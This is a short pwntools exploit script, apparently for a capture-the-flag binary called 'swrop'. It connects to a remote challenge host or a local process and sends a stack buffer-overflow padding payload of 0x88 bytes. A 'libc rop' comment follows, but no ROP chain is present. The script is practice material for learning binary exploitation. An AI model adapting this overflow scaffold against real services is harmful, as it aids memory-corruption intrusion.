from pwn import *

context.arch = 'amd64'
elf = ELF('./swrop')  # Load the target binary

# Set up remote or local debugging environment
if args.R:
    p = remote('lmao.lol', 7004)
elif args.H:
    p = process('./swrop')
else:
    context.terminal = ['tmux', 'splitw', '-h', '-p', '70']
    p = gdb.debug('./swrop',
                  gdbscript='''
                      b *main
                      c
                      ''')

payload = b"A" * 0x80 + b"A" * 0x8

# Send the payload and interact
p.sendlineafter(b'?', payload)
print(p.recvline().strip(b'\n'))
p.interactive()
## libc rop